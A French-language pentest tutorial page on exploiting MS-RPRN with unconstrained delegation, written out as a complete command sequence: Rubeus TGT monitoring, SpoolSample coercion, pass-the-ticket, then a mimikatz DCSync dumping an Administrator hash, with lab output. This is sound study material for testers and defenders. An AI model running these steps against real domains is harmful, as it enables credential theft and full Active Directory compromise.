---
title: MS-RPRN
permalink: /MS_RPRN/
---

# MS-RPRN

MS-RPRN est un protocole utilisé pour les printers. Il est cependant utilisable pour obtenir un accès administratif dans une forêt ou **sur une autre forêt avec laquelle on un trust**. (Voir [Not A Security Boundary: Breaking Forest Trusts](https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d)).

## Exploitation

L'exploitation utilise les éléments suivants:
- Un accès administratif sur un serveur avec **Unconstrained Delegation**. Par défaut ceci est le cas de tous les contrôleurs de domaine (serveur **CHOCOBO.goldsaucer.local**).
- Un serveur ciblé (serveur **MIDGAR.shinra-inc.local**)
- Il doit y avoir un accès réseau entre les deux serveurs et un trust bidirectionnel si les deux serveurs sont dans des domaines différents (y compris des forêts différentes)
- [Rubeus](https://github.com/GhostPack/Rubeus) et [SpoolSample](https://github.com/leechristensen/SpoolSample) à compiler et mimikatz.

Sur le serveur Chocobo.goldsaucer.local lancer:

``` 
.\Rubeus.exe monitor /interval:5
```

Ce script dumpera tout TGT obtenu par le serveur (ce qui arrivera en raison de l'unconstrained delegation). Laisser tourner et lancer dans un autre terminal:

``` 
.\SpoolSample.exe MIDGAR.shinra-inc.local CHOCOBO.goldsaucer.local
```

Ce second script va utiliser le service MS-RPN pour forcer le serveur MIDGAR à s'authentifier auprès du serveur contrôlé (CHOCOBO). En raison de l'unconstrained delegation, le serveur MIDGAR va envoyer son TGT dans le ticket de service Kerberos. Sur le cmd Rubeus on devrait avoir:

```
[+] 02/12/2018 21:58:26 - 4624 logon event for 'SHINRA-INC\MIDGAR$' from '192.168.80.100'
[*] Target LUID     : 0x2987c3
[*] Target service  : krbtgt

  UserName                 : MIDGAR$
  Domain                   : SHINRA-INC
  LogonId                  : 2721731
  UserSID                  : S-1-5-21-227358413-259298668-3497230074-1001
  AuthenticationPackage    : Kerberos
  LogonType                : Network
  LogonTime                : 02/12/2018 21:58:26
  LogonServer              :
  LogonServerDNSDomain     : SHINRA-INC.LOCAL
  UserPrincipalName        :

    ServiceName              : krbtgt/SHINRA-INC.LOCAL
    TargetName               :
    ClientName               : MIDGAR$
    DomainName               : SHINRA-INC.LOCAL
    TargetDomainName         : SHINRA-INC.LOCAL
    AltTargetDomainName      : SHINRA-INC.LOCAL
    SessionKeyType           : aes256_cts_hmac_sha1
    Base64SessionKey         : Uhj38P28/6m+AMvTlF4qPZ5iuAtsISQNCNAXGUypKME=
    KeyExpirationTime        : 01/01/1601 00:00:00
    TicketFlags              : name_canonicalize, pre_authent, renewable, forwarded, forwardable
    StartTime                : 02/12/2018 21:58:26
    EndTime                  : 03/12/2018 06:56:52
    RenewUntil               : 09/12/2018 20:56:52
    TimeSkew                 : 0
    EncodedTicketSize        : 1372
    Base64EncodedTicket      :

      doIFWDCCBVSgAwIBBaEDAgEWooIEUjCCBE5hggRKMIIERqADAgEFoRIbEFNISU5SQS1JTkMuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
      cmJ0Z3QbEFNISU5SQS1JTkMuTE9DQUyjggQCMIID/qADAgESoQMCAQKiggPwBIID7FszyHoAYZaQks5oJ8sTbwBtBXG3J+eadLQ/
      ueVE52c/ejXEd8z2YVTpOeN/FPsDUYABuxH4LJbD/dKxAfQNeuTmJUg4frHWqDvOarlmqc1MpQYqVCdY6JReEBNl30N67CycgGHs
      KbtOFhX80YlZrKFYHB1E2gSqIOhetLZydr7DwcAu5sF+NUFmoVc5efCuiJEDmUSp404r+TKf809sQ/v7IFm4ZYioRVPdfD+cQtLY
      OuHgErLFvrH9JRRF2/P9SNE4rvK+lmU8OEQWUnXfRMNKDOzd3Kigq0evkshDX8B7cCX47orK7Gm1YMxSTQrRjyaPl0DFbFOkd1Kj
      Q6QTdqgKkWjKFlAM6IvaB3hzNQv5ZLy3Bx8alkIm89gdR6xxkFx7ta81HSgEB2oDr5YxnSBXcXHUjDWaY3YSo2+Cgi5b8Ck4n932
      H75me2jVSccRajYWZbzjysnB6yGtnv/BivvbjjKWeFJKUdy8Xvh4zwWMiqBjj2tARGKK1XmJCBtehb3t/6GQhVcO6reZl6iS5WOm
      Q1JuASP1iAfQimKnBzljm1wo7dac/sWtCYAL78mkE8HK2phECwlxZ38dUp/yPXxRQ+Z6lCSfxsEF4XfmXDpxBGeNWpd+uvjfXexk
      Qe/Kml6Jwc8W5BGgP/IVlU4c/fPUijKjyXQIMnJZRyeDB32ujYOQb63dwTDWuxo6WTHQapzzoGZm5XAUKikbH+EdKKM4r4qxQ8XP
      8wUbGPppU7pSFN+ZgUtvLLYDV2Md/6ztEzQrRP0rd2uPLYXT6nef75VjR9UEKA1Gjxo8WvyvaXZdRKJQdvi4eWOr4luq3Re70/hF
      Fb8FccI8sEgpS9075dmEEKWgcEt3223ZBwBSbOqF6Emg0wQBypWfEquub57axbdsDop4557YSqliDXGd1DhvWENCGez4nPM4NQYj
      h3X0WeaKC03noJlqiWqXMnYUAoq7Cdo5OCvYORj8XT8eMV9vDXRe16wZVDvcUfqJnLa0605rNZwuX6adkLlre+G7rsJE7UReb6J0
      nnXxJwYHGq0QjilKJp5LX3AB1CexixZdkgxgnXgieQPOUsUton77/OFigcLQKk1/sfY6Qg+wSUxh9kGYCigqFultUp4s6E9cKeSG
      7w+Yb3Kty9XoxCCGAzF5gW2OU58gdHGk5qY+9d8YR35R5C9DLhY3tbtm8+Z1tYeyRUWw0k+Hi1Fwzm4qa0SyNTcFDI6xLmxUtnzJ
      Ce/oN3drOO25QwnLtEPhyBE3UK1RWAaBWetWKFLzAwv8hCyG288MU/8lPMqDXKkddHY43JlCIZzXOlO0X0KmKdJMaEVUUXf0V28h
      ZX/lo4HxMIHuoAMCAQCigeYEgeN9geAwgd2ggdowgdcwgdSgKzApoAMCARKhIgQgUhj38P28/6m+AMvTlF4qPZ5iuAtsISQNCNAX
      GUypKMGhEhsQU0hJTlJBLUlOQy5MT0NBTKIUMBKgAwIBAaELMAkbB01JREdBUiSjBwMFAGChAAClERgPMjAxODEyMDIyMTU4MjZa
      phEYDzIwMTgxMjAzMDY1NjUyWqcRGA8yMDE4MTIwOTIwNTY1MlqoEhsQU0hJTlJBLUlOQy5MT0NBTKklMCOgAwIBAqEcMBobBmty
      YnRndBsQU0hJTlJBLUlOQy5MT0NBTA==

[*] Extracted  1 total tickets
```

On peut alors utiliser mimikatz (ou autre) pour faire un DCsync en utilisant le TGT récupéré. Rubeus permet de faire un pass the ticket:

```
.\Rubeus.exe ptt /ticket:doIFWDCCBVSgAwIBBaEDAgEWooIEU
jCCBE5hggRKMIIERqADAgEFoRIbEFNISU5SQS1JTkMuTE9DQUyiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEFNISU5SQS1JTkMuTE9DQUyjggQCMIID/qADAgESo
QMCAQKiggPwBIID7F+UEe4HvHR188pbTGRg6+Smi1g5oGhtGqLSUYkDc/bViq8CfwcY2R9FgMqLoTUjUyjFXtsUvTUvoJ8boq7xt4LeUi6+JaCICTZsWy/DG
uisnNpZat1IOP5If7pvJPWwyZApWUMQfK21AHv4T/9lCes6Ilqk3ml3UX+l+rvJjIOxs3To/yhBZuWsxpaTsmg+FIyhY1HpsFuoMIP1GxPKDHuWKeKfOGHxG
2llYZp68f8Je6NpU120XdQC/dBbn2mY972fBfJfD4IpB7QkSAFHkX+vdEFUq4zIk+k/ge8fp4IZSIXzYEn+Bs3i1NqH0XRM23MoALD+h+HhX4bTaYMUeX3mr
W/Eg1mAwIwcDyqUjXT1vcwYNgoOUWKvondsKQBEEGB6VC2eiCFAdEoRSYpNNc8RBB0KPJ87zGLH4zBr6YNuAFj0RAW0WrNL5kImj6LfkUJ7fA+8L30/lqQ/M
/ryOlF43XZ35EuYZr+EADpWmNZgJ0kGyJQH5260xaPqPzrszlMgIqf25ZtplWU3hgYEGnkPtSPqDCfN+OpscSjBylASuzoPglF/2mWNbOoB0LgjUig9apACC
kRjDZhi21BI13RJHLntlzAwQhyUPv648RCPXFfW5wqxrUdzr1FZuPko0ms6hBntCC/FjHRLFElKdSrAGFWxiUE4FFrz9Urn0TsmpbHpzLE0oNpbKqWoC88x4
FNdWoGTRSOQl4syeMrzmpYTVLsCc5J2hQmk+oX2YaewfeEs1yRDWJt8WnHrCUUap04pIFewdlwnG5ojQJuGZuDtsTrBNkRLjcEoYxzmNrMMHYd/OMql30siW
k9Rrpn9lDX7P68fgC1R5rG/1ZyVXPvdcHEQO3i5QWPWF2gmjDznXBroMTOd4cxRZDllWaSPH77RJ7g0eOZLKRW3fd4AVNJBShZ6BqwK1xbhrne9OuBIf/1PE
k77F628T2dJ4H6mG/jnbdih92yQkXOiAYlcpkUBK4I7e/6mKeHt4egHGk0vPjw8u4wu7WGQtFGo9uE1euhELm+Q6l5zlAVLd7rb2vAVPqruFntssfe4RlKse
yN/V+kVteIyAf4u7lyEC64JEjVJHJN2BhrUcFjMY7XzhWKqnubR3zpr7ruk7rxwfP1DC6VbeHwo/GWWbIkn3TMo98NaBSUP0h7UqKtN6WOko8us6LfpBZAOx
ylnFaBS+Erfz4OPD5tlivR0EXFVp6hvKjHb9mfSdtOqAAKaGXV/1NULPUIVtgbyWnDKbj1S6f7wypzBHAnrfWJjfP3EeoNmZt4Xq1xcioEu1ZKYQTOMmfvW7
Epomgc8yidpJHQMb2VJtwVXhuyOGmwvXAVgo4HxMIHuoAMCAQCigeYEgeN9geAwgd2ggdowgdcwgdSgKzApoAMCARKhIgQgv+cfRiBxpphRN8cgCT5Khg3K5
uYK/oaeXVxIm8hTuWehEhsQU0hJTlJBLUlOQy5MT0NBTKIUMBKgAwIBAaELMAkbB01JREdBUiSjBwMFAGChAAClERgPMjAxODEyMDIyMDU2NTJaphEYDzIwM
TgxMjAzMDY1NjUyWqcRGA8yMDE4MTIwOTIwNTY1MlqoEhsQU0hJTlJBLUlOQy5MT0NBTKklMCOgAwIBAqEcMBobBmtyYnRndBsQU0hJTlJBLUlOQy5MT0NBT
A==

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.2.1


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

On peut alors faire un dcsync avec mimikatz (ici on récupère le hash de Administrator, mais on pourrait récupérer celui de krbtgt):

```
.\mimikatz.exe "lsadump::dcsync /domain:SHINRA-INC.local /user:SHINRA-INC\Administrator"

  .#####.   mimikatz 2.1.1 (x64) built on Sep 25 2018 15:08:14
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /domain:SHINRA-INC.local /user:SHINRA-INC\Administrator
[DC] 'SHINRA-INC.local' will be the domain
[DC] 'MIDGAR.SHINRA-INC.local' will be the DC server
[DC] 'SHINRA-INC\Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   : 01/01/1601 00:00:00
Password last change : 01/12/2018 21:45:58
Object Security ID   : S-1-5-21-227358413-259298668-3497230074-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: d961c5ec5be55f242a4e0671d364fda4
```

## Références
### Outils
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [SpoolSample](https://github.com/leechristensen/SpoolSample) 
### Articles
- [Not A Security Boundary: Breaking Forest Trusts (SpecterOps)](https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d)
- [Domain Controller Print Server + Unconstrained Kerberos Delegation = Pwned Active Directory Forest (ADSecurity)](https://adsecurity.org/?p=4056)
- [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
